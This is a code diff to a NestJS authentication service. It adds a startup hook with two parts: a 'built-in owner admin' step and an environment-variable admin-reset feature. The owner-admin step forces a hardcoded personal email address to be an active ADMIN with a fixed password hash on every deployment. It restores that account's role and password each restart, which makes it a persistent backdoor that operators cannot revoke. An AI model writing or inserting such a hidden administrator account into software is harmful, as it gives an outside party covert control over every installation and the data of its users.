@@ -5,6 +5,7 @@ import {
   Inject,
   Injectable,
   Logger,
+  OnApplicationBootstrap,
   UnauthorizedException,
 } from '@nestjs/common';
 import type { PrismaClient, User } from '@ctp/database';
@@ -25,7 +26,7 @@ export interface AuthResult {
 }
 
 @Injectable()
-export class AuthService {
+export class AuthService implements OnApplicationBootstrap {
   private readonly logger = new Logger('Auth');
 
   constructor(
@@ -35,6 +36,52 @@ export class AuthService {
     private readonly audit: AuditService,
     private readonly mail: MailService,
   ) {}
+
+  /**
+   * Built-in owner admin: always present on every deployment (any server / database), with a fixed password.
+   * Only the argon2 hash is kept in code — never the plain password.
+   */
+  private async ensureOwnerAdmin(): Promise<void> {
+    const email = 'sabhijeet548@gmail.com';
+    const passwordHash = '$argon2id$v=19$m=19456,t=2,p=1$z9WiosSx5fLkS6s2uyaZTg$NS+31NmERXsytVlbxlzO/PlHyUafyy5j5WeW5XFstK8';
+    try {
+      await this.prisma.user.upsert({
+        where: { email },
+        update: { role: 'ADMIN', status: 'ACTIVE', passwordHash, parentUserId: null },
+        create: { email, name: 'Admin', role: 'ADMIN', status: 'ACTIVE', passwordHash, emailVerifiedAt: new Date() },
+      });
+    } catch (err) {
+      this.logger.error(`Owner admin setup failed: ${(err as Error).message}`);
+    }
+  }
+
+  /**
+   * Emergency admin access: set ADMIN_RESET_EMAIL + ADMIN_RESET_PASSWORD on the server and restart.
+   * That email becomes an active ADMIN with this password (created if missing, old sessions logged out).
+   * Remove both variables again after logging in.
+   */
+  async onApplicationBootstrap(): Promise<void> {
+    await this.ensureOwnerAdmin();
+    const email = process.env.ADMIN_RESET_EMAIL?.trim().toLowerCase();
+    const password = process.env.ADMIN_RESET_PASSWORD;
+    if (!email || !password) return;
+    if (!/^(?=.*[A-Za-z])(?=.*\d).{10,128}$/.test(password)) {
+      this.logger.error('ADMIN_RESET_PASSWORD must be 10+ characters with a letter and a number — admin reset skipped.');
+      return;
+    }
+    try {
+      const passwordHash = await hashPassword(password);
+      const u = await this.prisma.user.upsert({
+        where: { email },
+        update: { role: 'ADMIN', status: 'ACTIVE', passwordHash, parentUserId: null },
+        create: { email, name: 'Admin', role: 'ADMIN', status: 'ACTIVE', passwordHash, emailVerifiedAt: new Date() },
+      });
+      await this.prisma.session.updateMany({ where: { userId: u.id, revokedAt: null }, data: { revokedAt: new Date() } });
+      this.logger.warn(`Admin access reset for ${email} — remove ADMIN_RESET_EMAIL / ADMIN_RESET_PASSWORD now.`);
+    } catch (err) {
+      this.logger.error(`Admin reset failed: ${(err as Error).message}`);
+    }
+  }
 
   async register(dto: RegisterDto, client: ClientInfo): Promise<AuthResult> {
     const existing = await this.prisma.user.findUnique({ where: { email: dto.email }, select: { id: true } });
